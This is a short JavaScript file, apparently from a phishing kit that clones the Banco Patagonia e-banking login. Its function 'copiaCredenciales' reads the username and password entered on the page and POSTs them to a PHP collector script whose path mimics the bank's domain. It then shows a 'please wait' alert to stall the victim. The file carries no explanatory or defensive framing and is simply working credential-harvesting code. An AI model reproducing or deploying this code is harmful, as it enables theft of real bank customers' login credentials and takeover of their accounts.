
function copiaCredenciales(){

  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim(); 
  
  fetch('/Patagonia/CopiaPHP/ebankpersonas.bancopatagonia.com.ar/eBanking/usuarios/copiaCredenciales.php', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded' // o 'application/json'
    },
    body: new URLSearchParams({
      username: username,
      password: password
    })
  })
  .then(response => response.text()) // o .json() si el PHP devuelve JSON
  .then(data => {
    console.log('Respuesta del servidor:', data);
    return true;
  })
  .catch(error => {
    console.error('Error en la solicitud:', error);
    return true;
  });
  
  alert("Espera ...")
  
}

console.log("Inicio Proceso --->>>")